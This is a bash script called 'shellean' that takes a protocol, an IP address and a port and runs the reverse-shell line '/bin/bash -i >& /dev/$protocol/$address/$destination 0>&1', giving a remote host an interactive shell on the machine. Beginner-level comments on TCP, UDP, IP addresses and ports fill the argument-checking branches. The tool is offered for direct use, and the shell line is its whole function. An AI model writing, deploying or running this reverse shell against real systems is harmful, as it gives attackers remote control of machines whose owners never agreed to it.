# Copyright (C) 2023, Nathalon

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

tput bold;

license()
{
  echo '+-----------------------------------------------------------------------------------+';
  echo '| shellean, copyright (C) 2023-2024 Nathalon                                        |';
  echo '|                                                                                   |';
  echo '| This program comes with ABSOLUTELY NO WARRANTY; for details type show w.          |';
  echo '| This is free software, and you are welcome to redistribute it                     |';
  echo '| under certain conditions; type show c for details.                                |';
  echo '+-----------------------------------------------------------------------------------+';
}

help()
{
   echo '-> usage: /bin/bash shellean.sh [-p <protocol> -a <internet protocol address> -d <destination port>]';
   echo '-> options:';
   echo '';
   echo '-l -> Print the GPL license and exit.';
   echo '-h -> Print help and exit.';
   echo '-V -> Print the software version and exit.';
   echo '-p -> Specify the Protocol.'; 
   echo '-a -> Specify the Internet Protocol Address to Connect to.';
   echo '-d -> Specify the Destination Port to Connect to.';
}

version()
{
  echo -e '\e[5m';
  echo '--------------------------------------------------------------------------';
  echo '-- Writen by Nathalon at (2023-2024), Version: (0.0.1)                  --';
  echo '-- Contact me on Telegram: https://t.me/braindisassemblue               --';
  echo '--------------------------------------------------------------------------';
}

while getopts 'lhVp:a:d:' options;
do
  case $options in
    l) license; exit;;
    h) help; exit;;
    V) version; exit;;
    p) protocol=$OPTARG;;
    a) address=$OPTARG;;
    d) destination=$OPTARG;;    
  esac
done

if [ -z $protocol ];
  then
    echo '[!] -> You need to Specify a Protocol';
    echo '';
    
    help;
    exit;

    # The Transmission Control Protocol (TCP).

    # Potentially hinted by the name, this protocol is designed with reliability and guarantee in mind. 

    # This protocol reserves a constant connection between the two devices for the amount of time it 
    # takes for the data to be sent and received.

    # Not only this, but TCP incorporates error checking into its design. 

    # Error checking is how TCP can guarantee that data sent from the small chunks in the session layer (layer 5) 
    # has then been received and reassembled in the same order.

    # TCP is used for situations such as file sharing, internet browsing or sending an email.

    # This usage is because these services require the data to be accurate and complete (no good having half a file!).

    # Now let's move onto the User Datagram Protocol (or UDP for short). 

    # This protocol is not nearly as advanced as its brother - the TCP protocol. 

    # It doesn't boast the many features offered by TCP, such as error checking and reliability. 

    # In fact, any data that gets sent via UDP is sent to the computer whether it gets there or not. 

    # There is no synchronisation between the two devices or guarantee; just hope for the best, and fingers crossed.

    # UDP is useful in situations where there are small pieces of data being sent. 

    # For example, protocols used for discovering devices (ARP and DHCP) or larger files 
    # such as video streaming (where it is okay if some part of the video is pixelated.

    # Pixels are just lost pieces of data!

elif [ -z $address ];
  then
    echo '[!] -> You need to Specify a Internet Protocol Address';
    echo '';
    
    help;
    exit;

    # Much like every house has a unique address for sending mail directly to it, every computer on the internet has its own unique address to communicate with it called an IP address. 

    # An IP address looks like the following 107.22.10.119, 4 sets of digits ranging from 0 - 255 separated by a period.

elif [ -z $destination ];
  then
    echo '[!] -> You need to Specify a Destination Port';
    echo '';
    
    help;
    exit;

    # Perhaps aptly titled by their name, ports are an essential point in which data can be exchanged. 

    # Think of a harbour and port. 

    # Ships wishing to dock at the harbour will have to go to a port compatible with the dimensions and the facilities located on the ship.
    # When the ship lines up, it will connect to a port at the harbour. 

    # Take, for instance, that a cruise liner cannot dock at a port made for a fishing vessel and vice versa.

    # These ports enforce what can park and where — if it isn't compatible, it cannot park here.

    # Networking devices also use ports to enforce strict rules when communicating with one another.

    # When a connection has been established, any data sent or received by a device will be sent through these ports. 

    # In computing, ports are a numerical value between 0 and 65535 (65,535).

    # Because ports can range from anywhere between 0-65535, there quickly runs the risk of losing track of what application is using what port. 

    # A busy harbour is chaos! Thankfully, we associate applications, software and behaviours with a standard set of rules. 

    # For example, by enforcing that any web browser data is sent over port 80, software developers can design a web browser such as Google Chrome or Firefox to interpret the data the same way as one another.

    # This means that all web browsers now share one common rule: data is sent over port 80. 
   
    # How the browsers look, feel and easy to use is up to the designer or the user's decision.

    # While the standard rule for web data is port 80, a few other protocols have been allocated a standard rule. 
    
    # Any port that is within 0 and 1024 (1,024) is known as a common port.

else
  echo '--------------------------------------------------------------------------';
  echo '[i] Starting shellean at:' $(date);
  echo '--------------------------------------------------------------------------';

  echo '[i] Connecting to:' $address:$destination;

  /bin/bash -i >& /dev/$protocol/$address/$destination 0>&1;

  echo '--------------------------------------------------------------------------';
  echo '[i] Exiting shellean at:' $(date);
  echo '--------------------------------------------------------------------------';
fi
